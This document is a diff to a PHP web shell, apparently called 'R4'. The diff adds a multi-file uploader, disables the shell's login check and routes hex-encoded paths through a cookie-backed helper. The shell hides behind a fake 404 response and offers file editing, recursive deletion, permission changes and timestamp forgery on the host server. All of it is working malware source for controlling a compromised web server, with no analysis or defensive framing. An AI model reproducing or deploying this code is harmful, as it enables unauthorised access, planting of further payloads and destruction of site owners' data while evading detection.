@@ -22,9 +22,17 @@
 
 define('R4_DEBUG', true); // show post data
 define('R4_SILENT_MODE', true); // 404 response code
-define('R4_LOGIN_MODE', true); // cookie based authentication (Vulnerable)
+define('R4_LOGIN_MODE', false); // cookie based authentication (Vulnerable)
 define('R4_PASSPHARSE', '74d6d852df92296653bd64746e6c34d20e85e86e'); // sha1
-
+/** Alternative Functions */
+if(!function_exists('hex2bin')) {
+    function hex2bin($hexdec)
+    {
+        $bin = pack("H*", $hexdec);
+        return $bin;
+    }
+}
+/** End of alternative Functions */
 function getDirectoryContents($dir)
 {
     $dirs = scandir($dir);
@@ -266,6 +274,24 @@ function authLogin()
     }
     die;
 }
+/**
+ * Get path to directory or files if set to true get the latest directory after an action
+ */
+function getPath($opt = false)
+{
+    if(!isset($_COOKIE['path'])) {
+        $path = isset($_POST['path']) ? $_POST['path'] : bin2hex(getcwd());
+        setcookie('path', $path);
+    }
+    $pathToFileOrDir = isset($_POST['path']) ? hex2bin($_POST['path']) : hex2bin($_COOKIE['path']);
+
+    if($opt) {
+        return dirname($pathToFileOrDir);
+    }
+    else {
+        return $pathToFileOrDir;
+    }
+}
 
 if (R4_SILENT_MODE) {
     header('HTTP/1.1 404 Not Found');
@@ -274,7 +300,21 @@ if (R4_LOGIN_MODE) {
     activateLoginSystem();
 }
 if (R4_DEBUG) {
-    print_r($_POST);
+    var_dump($_POST);
+}
+// Preaction
+
+if (isset($_FILES['file'])) {
+    $file = $_FILES['file'];
+    $fileCount = count($file['name']);
+
+    for ($x = 0; $x < $fileCount; $x++) {
+        $fileOrigin = $file['tmp_name'][$x];
+        $fileDestination = getPath() . DIRECTORY_SEPARATOR . $file['name'][$x];
+        if(!@move_uploaded_file($fileOrigin, $fileDestination)) {
+            return '<script>alert("Upload failed");</script>';
+        }
+    }
 }
 ?>
 <!DOCTYPE html>
@@ -380,40 +420,41 @@ if (R4_DEBUG) {
         $actions = hex2bin($actions);
         switch ($actions) {
             case 'open_file':
-                editFile(hex2bin($_POST['path']));
+                editFile(getPath());
                 break;
             case 'save_file':
                 if (!writeFileContents(hex2bin($_POST['path']), hex2bin($_POST['content']))) {
                     echo "failed";
                 }
-                echo 'success';
+                chdir(getPath(true));
                 break;
             case 'open_dir':
-                if (!isset($_POST['path'])) {
-                    $_POST['path'] = bin2hex(getcwd());
-                }
-                chdir(hex2bin($_POST['path']));
+                chdir(getPath());
                 break;
             case 'chmod':
-                filePermission(hex2bin($_POST['path']));
+                filePermission(getPath());
                 break;
             case 'chmod_save':
-                if (!@chmod(hex2bin($_POST['path']), octdec($_POST['permission']))) {
+                if (!@chmod(getPath(), octdec($_POST['permission']))) {
                     echo 'failed';
                 }
+                chdir(getPath(true));
                 break;
             case 'touch':
-                fileChangedate(hex2bin($_POST['path']));
+                fileChangedate(getPath());
+                chdir(getPath(true));
                 break;
             case 'touch_save':
-                if (!changeFileDate(hex2bin($_POST['path']), $_POST['date'])) {
+                if (!changeFileDate(getPath(), $_POST['date'])) {
                     echo "failed";
                 }
+                chdir(getPath(true));
                 break;
             case 'rm':
-                if (!deleteAll(hex2bin($_POST['path']))) {
+                if (!deleteAll(getPath())) {
                     echo "failed";
                 }
+                chdir(getPath(true));
                 break;
         }
     }
@@ -501,7 +542,7 @@ if (R4_DEBUG) {
         </thead>
         <tbody>
             <?php $contents = getDirectoryContents(getcwd());
-
+            // Directory fetch
             if (isset($contents['dirs'])) {
                 foreach ($contents['dirs'] as $dirName) {
                     $path = getcwd();
@@ -522,6 +563,7 @@ if (R4_DEBUG) {
                         </tr>";
                 }
             }
+            // Files fetch
             if (isset($contents['files'])) {
                 foreach ($contents['files'] as $fileName) {
                     $path = getcwd();
@@ -544,6 +586,17 @@ if (R4_DEBUG) {
             } ?>
         </tbody>
     </table>
+
+    <!-- Uploader-->
+    <form method="POST" enctype="multipart/form-data">
+        <div class="">
+            <input type="file" name="file[]" multiple />
+        </div>
+        <button class="button-primary" type="submit" name="submit_file">Upload</button>
+    </form>
+
+    <!-- Hidden action encoder-->
+
     <form id="action_container" method="POST">
         <input type="hidden" id="path" name="path" />
         <input type="hidden" id="actions" name="actions" />
